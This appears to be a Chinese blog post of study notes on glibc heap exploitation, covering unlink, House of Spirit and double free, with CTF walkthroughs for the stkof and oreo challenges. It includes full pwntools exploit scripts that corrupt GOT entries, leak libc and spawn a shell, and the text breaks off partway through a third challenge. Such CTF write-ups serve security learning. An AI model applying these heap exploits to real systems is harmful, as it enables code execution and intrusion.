<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>heap_details | é£äº‘é˜</title>
  <meta name="keywords" content="">
  <meta name="description" content="heap_details | é£äº‘é˜">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="çº¢å®çŸ³ğŸ¬ ğŸ“’ æ•°å­—è¿ç®—ç¬¦ä¼˜å…ˆçº§  ğŸ“’ å–ä½™åªè¿”å›æ­£æ•°  puts (5 % 3)     # prints  2   puts (-5 % 3)    # prints  1   puts (5 % -3)    # prints -1   puts (-5 % -3)   # prints -2   ğŸ¬ é€»è¾‘æˆ–è¿”å›å€¼å–å†³äºç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œè¿”å›ç¬¬ä¸€ä¸ªæ“ä½œæ•°å¦‚æœå…¶ä¸ºéå‡ï¼Œå¦åˆ™è¿”å›ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="çº¢å®çŸ³å­¦ä¹ ç¬”è®°">
<meta property="og:url" content="https://primelyw.github.io/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="é£äº‘é˜">
<meta property="og:description" content="çº¢å®çŸ³ğŸ¬ ğŸ“’ æ•°å­—è¿ç®—ç¬¦ä¼˜å…ˆçº§  ğŸ“’ å–ä½™åªè¿”å›æ­£æ•°  puts (5 % 3)     # prints  2   puts (-5 % 3)    # prints  1   puts (5 % -3)    # prints -1   puts (-5 % -3)   # prints -2   ğŸ¬ é€»è¾‘æˆ–è¿”å›å€¼å–å†³äºç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œè¿”å›ç¬¬ä¸€ä¸ªæ“ä½œæ•°å¦‚æœå…¶ä¸ºéå‡ï¼Œå¦åˆ™è¿”å›ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚">
<meta property="og:image" content="https://primelyw.github.io/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200422173243739.png">
<meta property="article:published_time" content="2020-04-21T12:18:56.368Z">
<meta property="article:modified_time" content="2020-04-22T16:29:29.169Z">
<meta property="article:author" content="æ«äº‘æ">
<meta property="article:tag" content="ruby">
<meta property="article:tag" content="lang">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://primelyw.github.io/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200422173243739.png">


<link rel="icon" href="/img/avatar2.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/github.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.0.1" ></script>

<meta name="generator" content="Hexo 4.2.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value="">
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar2.jpg" />
</a>
<div class="author">
    <span>æ«äº‘æ</span>
</div>

<div class="icon">
    
</div>



<a class="more-menus">æ›´å¤šèœå•</a>


<ul>
    <li><div class="all active">å…¨éƒ¨æ–‡ç« </div></li>
    
        
            <li><div data-rel="CTF">CTF</div></li>
        
    
        
            <li><div data-rel="Fuzz">Fuzz</div></li>
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/">å…³äº</a><a style="width: 50%"  class="friends">å‹é“¾</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="23">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        å‹æƒ…é“¾æ¥
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://blog.plusls.com/">å¸ˆçˆ¶</a></li>
            
            <li><a target="_blank" href="https://blog.xhyh.best/">æ½‡æ™—å®‡æµ©</a></li>
            
            <li><a target="_blank" href="http://pzhxbz.cn/">pzhxbz</a></li>
            
            <li><a target="_blank" href="https://evi0s.com/">evi0s</a></li>
            
            <li><a target="_blank" href="https://enivs0rt.github.io/">enivS0rt</a></li>
            
            <li><a target="_blank" href="http://sup3rgate.xyz/">SuperGate</a></li>
            
            <li><a target="_blank" href="https://ccdragon.cc/">ccdragon</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode === 13){return false;}">
        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">Pwn</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CTF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CVE</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">fuzz</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">afl</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">Defcon</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">ruby</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">lang</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <nav id="title-list-nav">
        
        <a  class=""
           href="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="æ•°å­—ä¸­å›½è™ç¬¦ç½‘å®‰å¤§èµ›2020">æ•°å­—ä¸­å›½è™ç¬¦ç½‘å®‰å¤§èµ›2020</span>
            <span class="post-date" title="2020-04-23 12:50:42">2020/04/23</span>
        </a>
        
        <a  class=""
           href="/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="ruby,lang"
           data-author="" >
            <span class="post-title" title="çº¢å®çŸ³å­¦ä¹ ç¬”è®°">çº¢å®çŸ³å­¦ä¹ ç¬”è®°</span>
            <span class="post-date" title="2020-04-21 20:18:56">2020/04/21</span>
        </a>
        
        <a  class="CTF "
           href="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="2018ç½‘é¼æ¯">2018ç½‘é¼æ¯</span>
            <span class="post-date" title="2020-04-15 00:00:00">2020/04/15</span>
        </a>
        
        <a  class="Fuzz "
           href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/"
           data-tag="fuzz,afl"
           data-author="" >
            <span class="post-title" title="AFLåŸºç¡€">AFLåŸºç¡€</span>
            <span class="post-date" title="2020-04-10 12:35:49">2020/04/10</span>
        </a>
        
        <a  class=""
           href="/2020/04/05/CVEs/"
           data-tag="Pwn,CVE"
           data-author="" >
            <span class="post-title" title="CVEs">CVEs</span>
            <span class="post-date" title="2020-04-05 20:45:40">2020/04/05</span>
        </a>
        
        <a  class="CTF "
           href="/2020/02/10/NullConCTF2020/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="NullConCTF2020">NullConCTF2020</span>
            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
        </a>
        
        <a  class="CTF "
           href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="å¼ºç½‘æ¯2019">å¼ºç½‘æ¯2019</span>
            <span class="post-date" title="2020-01-16 02:06:12">2020/01/16</span>
        </a>
        
        <a  class="CTF "
           href="/2019/11/30/N1CTF2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="N1CTF2019">N1CTF2019</span>
            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
        </a>
        
        <a  class="CTF "
           href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="å®‰æ´µæ¯2019">å®‰æ´µæ¯2019</span>
            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/2019/11/07/Advance-rop/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Advance-rop">Advance-rop</span>
            <span class="post-date" title="2019-11-07 09:50:48">2019/11/07</span>
        </a>
        
        <a  class=""
           href="/2019/10/20/heap_details/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="heap_details">heap_details</span>
            <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
        </a>
        
        <a  class="CTF "
           href="/2019/10/12/RoarCTF-2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="RoarCTF-2019">RoarCTF-2019</span>
            <span class="post-date" title="2019-10-12 00:00:00">2019/10/12</span>
        </a>
        
        <a  class=""
           href="/2019/07/22/Pwner/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="pwner">pwner</span>
            <span class="post-date" title="2019-07-22 00:00:00">2019/07/22</span>
        </a>
        
        <a  class=""
           href="/2019/07/18/tmux/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="tmux">tmux</span>
            <span class="post-date" title="2019-07-18 00:00:00">2019/07/18</span>
        </a>
        
        <a  class=""
           href="/2019/07/11/server_misc/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="server_misc">server_misc</span>
            <span class="post-date" title="2019-07-11 00:00:00">2019/07/11</span>
        </a>
        
        <a  class=""
           href="/2019/07/07/git_handbook/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="git handbook">git handbook</span>
            <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
        </a>
        
        <a  class=""
           href="/2019/05/26/assembly/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="assembly">assembly</span>
            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
        </a>
        
        <a  class=""
           href="/2019/05/10/pwning/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="pwning">pwning</span>
            <span class="post-date" title="2019-05-10 00:00:00">2019/05/10</span>
        </a>
        
        <a  class=""
           href="/2019/05/01/finance/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="finance">finance</span>
            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
        </a>
        
        <a  class="CTF "
           href="/2019/05/01/Defcon2019Q/"
           data-tag="Pwn,CTF,Defcon"
           data-author="" >
            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
        </a>
        
        <a  class=""
           href="/2019/04/30/shellcode/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="shellcode">shellcode</span>
            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
        </a>
        
        <a  class=""
           href="/2019/04/30/elf_protector/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="elf_protector">elf_protector</span>
            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
        </a>
        
        <a  class="CTF "
           href="/2019/04/29/StarCTF/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="StarCTF">StarCTF</span>
            <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-heap_details" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">heap_details</h1>
    
    <div class="article-meta">
        
        
        
        
    </div>
    <div class="article-meta">
        
        åˆ›å»ºæ—¶é—´:<time class="date" title='æ›´æ–°æ—¶é—´: 2020-04-02 01:02:33'>2019-10-20 00:00</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            é˜…è¯»:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#å †åˆ©ç”¨å­¦ä¹ "><span class="toc-text">å †åˆ©ç”¨å­¦ä¹ </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unlink"><span class="toc-text">Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2014-HITCON-stkof"><span class="toc-text">2014 HITCON stkof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-spirit"><span class="toc-text">House of spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#binary-ï¼š-oreo-ctf-wiki"><span class="toc-text">binary ï¼š oreo (ctf-wiki) ;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-free"><span class="toc-text">Double free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#binary-noinfoleak-è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›"><span class="toc-text">binary: noinfoleak (è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-2-23-ä»£ç -Check"><span class="toc-text">glibc-2.23 ä»£ç  Check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#malloc-c-æºç åˆ†æ"><span class="toc-text">malloc.c æºç åˆ†æ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#æ”»å‡»Demo"><span class="toc-text">æ”»å‡»Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#double-free"><span class="toc-text">double free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-force"><span class="toc-text">House of force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-spirit-1"><span class="toc-text">House of spirit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-lore"><span class="toc-text">House of lore</span></a></li></ol></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://github.primelyw.io/images/image-20200116182337942.png" alt="image-20200116182337942"></p>
<h1 id="å †åˆ©ç”¨å­¦ä¹ "><a href="#å †åˆ©ç”¨å­¦ä¹ " class="headerlink" title="å †åˆ©ç”¨å­¦ä¹ "></a>å †åˆ©ç”¨å­¦ä¹ </h1><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><pre><code class="c">//glibc 2.23 unlink define:
#define unlink(AV, P, BK, FD)                                                                                              
  {                                                                                                                         
    FD = P-&gt;fd;                                                                                                             
    BK = P-&gt;bk;                                                                                                             
    if (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))
      malloc_printerr(check_action, &quot;corrupted double-linked list&quot;, P, AV);
    else
    { 
      FD-&gt;bk = BK;
      BK-&gt;fd = FD;  
         ...
        ....
    }

//glibc 2.27
    #define unlink(AV, P, BK, FD)
  {  
    if (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0))
      malloc_printerr(&quot;corrupted size vs. prev_size&quot;); 
    FD = P-&gt;fd;                      
    BK = P-&gt;bk;  
    if (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))
      malloc_printerr(&quot;corrupted double-linked list&quot;);
    else
    {   
      FD-&gt;bk = BK;
      BK-&gt;fd = FD;  
    }</code></pre>
<p>Unlinkåˆ©ç”¨åŸç†æ˜¯é€šè¿‡å †æº¢å‡ºå†™å…¥çš„å­—èŠ‚è¦†ç›–åä¸€ä¸ªchunkï¼Œä¿®æ”¹äº†nextchunk-&gt;sizeçš„prev_in_useä¸º0ï¼Œfree(small_chunk or large_chunk)çš„æ—¶å€™ï¼Œå°±ä¼šunlik current chunkã€‚æ§åˆ¶P-&gt;fd å’Œ P-&gt;bk ä¸ºåˆé€‚çš„å­—èŠ‚ï¼Œåœ¨åˆé€‚çš„æƒ…å†µä¸‹å¯ä»¥è¾¾åˆ°ä»»æ„åœ°å€è¯»å†™ ï¼Œå¨åŠ›å·¨å¤§ã€‚</p>
<p>ä¸€ç§æƒ…å†µæ˜¯ï¼š</p>
<p>æœ‰ä¸€ä¸ªchunk listï¼Œè®°å½•ä¸€ä¸‹å †çš„æŒ‡é’ˆã€‚</p>
<p>X åœ¨ chunk_list çš„åœ°å€åŒºé—´ä¸­ï¼Œ*X = Pã€‚</p>
<p>æ”¹P-&gt;fd = X-0x18; P-&gt;bk = X-0x10;</p>
<p>æ‰§è¡Œunlink(P)æ—¶ï¼ŒFD = X-0x18; BK = X-0x10;</p>
<p>FD-&gt;bk = BK. &lt;=&gt; *(X-0x18+0x18) = *(X)=  X-0x10;</p>
<p>BK-&gt;fd = FD &lt;=&gt; *(x-0x10+0x10) = *(X) = X-0x18;</p>
<p>è¿™æ ·åœ¨chunk_listä¸­çš„Xåœ°å€æ„é€ äº†ä¼ªheap chunkï¼Œé€šè¿‡ç¨‹åºçš„åŠŸèƒ½ï¼ˆæ¯”å¦‚edit or change å‡½æ•°ï¼Œå †é¢˜ç›®ä¸€èˆ¬æœ‰è¿™äº›åŠŸèƒ½ï¼‰ã€‚é€šè¿‡editeä¿®æ”¹*(X)çš„å†…å®¹åï¼Œchunk_listçš„å†…å®¹ä¹Ÿè¢«ä¿®æ”¹ï¼Œè€Œä¸”å†…å®¹ä»»æ„æ”¹å†™ã€‚å†é€šè¿‡editå¯ä»¥å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚åç»­å°±æ˜¯leak @gotï¼Œä¸ºæ‰€æ¬²ä¸ºã€‚</p>
<h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p>glibcä¸º2.23</p>
<p>é€†å‘åˆ†æï¼Œæ»¡è¶³ä¸Šè¿°åˆ©ç”¨æ¡ä»¶ã€‚</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
bn = process(&#39;./stkof&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,False)
puts_libc = libc.symbols[&#39;puts&#39;]

context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
#gdb.attach(bn,&#39;b *0x0400B07&#39;)
#context.log_level = &#39;debug&#39;

def add(size):
    bn.sendline(&#39;1&#39;);sleep(0.05)
    bn.sendline(str(size));sleep(0.05)

def delete(idx):
    bn.sendline(&#39;3&#39;);sleep(0.05)
    bn.sendline(str(idx));sleep(0.05)

def edit(idx,content):
    bn.sendline(&#39;2&#39;);sleep(0.05)
    bn.sendline(str(idx));sleep(0.05)
    bn.sendline(str(len(content)));sleep(0.05)
    bn.send(content);sleep(0.05)

def show(idx):
    bn.sendline(&#39;4&#39;);sleep(0.05)
    bn.sendline(str(idx));sleep(0.05)

pool = 0x00602140+0x8*4 #4
x = pool
fd = x - 0x18
bk = x-0x10
print(hex(fd),hex(bk))

for i in range(4):
    add(0x30)

add(0xf0)

puts_got = 0x602020
free_got = 0x602018
puts_plt = 0x400760

payload = p64(0)+p64(0)+p64(fd)+p64(bk)+&#39;a&#39;*0x10+p64(0x30)+&#39;\x00&#39;
edit(4,payload)

delete(5)
payload = p64(free_got)+p64(puts_got)
edit(4,payload)
edit(1,p64(puts_plt))
delete(2)
for i in range(9):
    bn.recvuntil(&#39;OK\n&#39;)
real_puts = u64(bn.recvn(6)+&#39;\x00&#39;*2)
print(hex(real_puts))
base = real_puts-puts_libc
one = base + 0xf1147
edit(1,p64(one))
delete(3)

bn.interactive()
</code></pre>
<h2 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h2><h3 id="binary-ï¼š-oreo-ctf-wiki"><a href="#binary-ï¼š-oreo-ctf-wiki" class="headerlink" title="binary ï¼š oreo (ctf-wiki) ;"></a>binary ï¼š oreo (ctf-wiki) ;</h3><blockquote>
<p>download link: <a href="https://github.com/primelyw/pwn" target="_blank" rel="noopener">https://github.com/primelyw/pwn</a></p>
</blockquote>
<p>è¿è¡ŒELFï¼Œåˆæ­¥è§‚å¯Ÿï¼š</p>
<pre><code>Welcome to the OREO Original Rifle Ecommerce Online System!

     ,______________________________________
    |_________________,----------._ [____]  -,__  __....-----=====
                   (_(||||||||||||)___________/                   |
                      `----------&#39;   OREO [ ))&quot;-,                   |
                                           &quot;&quot;    `,  _,--....___    |
                                                   `/           &quot;&quot;&quot;&quot;

What would you like to do?

1. Add new rifle
2. Show added rifles
3. Order selected rifles
4. Leave a Message with your Order
5. Show current stats
6. Exit!
Action: </code></pre><p>Ida åˆ†æï¼š</p>
<pre><code>.bss:0804A2A0 order_cnt       dd ?                    ; DATA XREF: func3+5Aâ†‘r
.bss:0804A2A0                                         ; func3+62â†‘w ...
.bss:0804A2A4 rifle_cnt       dd ?                    ; DATA XREF: func1+C5â†‘r
.bss:0804A2A4                                         ; func1+CDâ†‘w ...
.bss:0804A2A8 ; char *dword_804A2A8
.bss:0804A2A8 dword_804A2A8 </code></pre><p>0x804A2A0 è®¢å•æ•°é‡</p>
<p>0804A2A4 æªæ”¯æ•°é‡</p>
<p>0804A2A8  åœ°å€ï¼Œç•™è¨€åœ°å€ã€‚</p>
<blockquote>
<p>å¢åŠ æªæ”¯æ•°é‡çš„å‡½æ•°</p>
</blockquote>
<pre><code class="c">unsigned int func1()
{
  char *v1; // [esp+18h] [ebp-10h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  v1 = rifle_chunk;
  rifle_chunk = (char *)malloc(0x38u);
  if ( rifle_chunk )
  {
    *((_DWORD *)rifle_chunk + 13) = v1;
    printf(&quot;Rifle name: &quot;);
    fgets(rifle_chunk + 25, 56, stdin);
    pro_read(rifle_chunk + 25);
    printf(&quot;Rifle description: &quot;);
    fgets(rifle_chunk, 56, stdin);
    pro_read(rifle_chunk);
    ++rifle_cnt;
  }
  else
  {
    puts(&quot;Something terrible happened!&quot;);
  }
  return __readgsdword(0x14u) ^ v2;
}</code></pre>
<p>0x38å¤§å°çš„chunkã€‚</p>
<p>0~24 description</p>
<p>25~51 name å­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥ä¿®æ”¹ next_ptr</p>
<p>52~56 next_ptr</p>
<blockquote>
<p>å¢åŠ è®¢å•ï¼Œæ¸…ç©ºæªæ”¯æ•°é‡çš„å‡½æ•°</p>
</blockquote>
<pre><code>unsigned int func3()
{
  char *ptr; // ST18_4
  char *v2; // [esp+14h] [ebp-14h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  v2 = rifle_chunk;
  if ( rifle_cnt )
  {
    while ( v2 )
    {
      ptr = v2;
      v2 = (char *)*((_DWORD *)v2 + 13);
      free(ptr);
    }
    rifle_chunk = 0;
    ++order_cnt;
    puts(&quot;Okay order submitted!&quot;);
  }
  else
  {
    puts(&quot;No rifles to be ordered!&quot;);
  }
  return __readgsdword(0x14u) ^ v3;
</code></pre><p>é“¾è¡¨åˆ é™¤æªæ”¯ï¼Œæ— æ³• double_free</p>
<blockquote>
<p>æ˜¾ç¤ºæªæ”¯ä¿¡æ¯çš„å‡½æ•°</p>
</blockquote>
<pre><code>unsigned int func2()
{
  char *i; // [esp+14h] [ebp-14h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;===================================&quot;);
  for ( i = rifle_chunk; i; i = (char *)*((_DWORD *)i + 13) )
  {
    printf(&quot;Name: %s\n&quot;, i + 25);
    printf(&quot;Description: %s\n&quot;, i);
    puts(&quot;===================================&quot;);
  }
  return __readgsdword(0x14u) ^ v2;
</code></pre><p>æªçš„æ•°æ®ç»“æ„ chunk ä¸­çš„ next_ptr å¯ä»¥è¢«ä¿®æ”¹ï¼Œé€šè¿‡è¯¥å‡½æ•°æ³„æ¼gotåœ°å€ã€‚</p>
<blockquote>
<p>ç•™è¨€å‡½æ•°</p>
</blockquote>
<pre><code>unsigned int func4()
{
  unsigned int v0; // ST1C_4

  v0 = __readgsdword(0x14u);
  printf(&quot;Enter any notice you&#39;d like to submit with your order: &quot;);
  fgets(dword_804A2A8, 128, stdin);
  pro_read(dword_804A2A8);
  return __readgsdword(0x14u) ^ v0;
}</code></pre><blockquote>
<p>åˆ©ç”¨æ€è·¯ï¼š</p>
<ol>
<li>é€šè¿‡è¾“å…¥æº¢å‡ºä¿®æ”¹æªçš„ç»“æ„ next_ptr ä¸ºgotçš„åœ°å€ã€‚è®¡ç®—å‡ºsystemåœ°å€</li>
<li>House of spirit ã€‚é€šè¿‡func2å°†å®ƒfreeæ‰ã€‚ç›®æ ‡åœ¨å¾—åˆ°å†™å…¥0x804A2A8çš„æƒé™</li>
<li>0x804A2A8æ”¹å†™ä¸ºgotåœ°å€ã€‚é€šè¿‡func4æ”¹å†™got</li>
</ol>
</blockquote>
<p>åˆ©ç”¨è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code class="python">#coding=utf8

from pwn import * 
p = process(&#39;./oreo&#39;)

elf = ELF(&#39;./oreo&#39;)
printf_got = elf.got[&#39;printf&#39;]
libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
strlen_got = elf.got[&#39;strlen&#39;]
printf_base = libc.symbols[&#39;printf&#39;]
sys_base = 0x3ada0


def add(name,note):
    #p.recvuntil(&#39;Action:&#39;)
    sleep(0.001);p.sendline(&#39;1&#39;);
    #p.recvuntil(&#39;Rifle name: &#39;)
    p.sendline(name);sleep(0.001)
    #p.recvuntil(&#39;Rifle description: &#39;)
    p.sendline(note);sleep(0.001)
def show():
    p.sendline(&#39;2&#39;);sleep(0.001)

def order():
    p.sendline(&#39;3&#39;);sleep(0.001)

def leave_note(note):
    p.sendline(&#39;4&#39;);sleep(0.001)
    p.sendline(note);sleep(0.001)


add(&#39;a&#39;*27+p32(printf_got),&#39;ha&#39;)
show()
p.recvuntil(&#39;Description: &#39;);p.recvuntil(&#39;Description: &#39;)
printf_real = u32(p.recv(4))
print printf_real

for i  in range(0x3f):
    add(&#39;a&#39;,&#39;a&#39;)

add(&#39;a&#39;*27+p32(0x804A2A8),&#39;hahha&#39;)
leave_note((0x20-4) * &#39;a&#39;+p32(0) + p32(0x40) + p32(0x100))
order()
add(&#39;ok&#39;,p32(strlen_got)+&#39;hahhaa&#39;)
sys_real  = printf_real +sys_base - printf_base;
leave_note(p32(sys_real)+&#39;;/bin/sh&#39;)
p.interactive()
</code></pre>
<h2 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h2><h3 id="binary-noinfoleak-è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›"><a href="#binary-noinfoleak-è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›" class="headerlink" title="binary: noinfoleak (è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›)"></a>binary: noinfoleak (è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›)</h3><blockquote>
<p>download link: <a href="https://github.com/primelyw/pwn" target="_blank" rel="noopener">https://github.com/primelyw/pwn</a></p>
</blockquote>
<p>æµ‹è¯•fastbin çš„å¤§å°è„šæœ¬</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main(){
  for(int size = 1; size&lt;=120; size++ ){
    void *p = malloc(size);
    printf(&quot;(%d,0x%llx)\n&quot;,size,*((long long *)p-1));
  }
  return 0;
}</code></pre>
<blockquote>
<p>è¿è¡Œç¨‹åºåˆæ­¥è§‚å¯Ÿ</p>
</blockquote>
<pre><code>root@prime:/ctf/work/pwn# ./noinfoleak 
&gt;1
&gt;3
&gt;4
&gt;5
No Such Choice
&gt;
No Such Choice
&gt;
No Such Choice
&gt;
No Such Choice
&gt;</code></pre><p>æ²¡æœ‰ä»»ä½•å¯åˆ©ç”¨çš„è¾“å‡ºã€‚</p>
<blockquote>
<p>idaåˆ†æ</p>
</blockquote>
<blockquote>
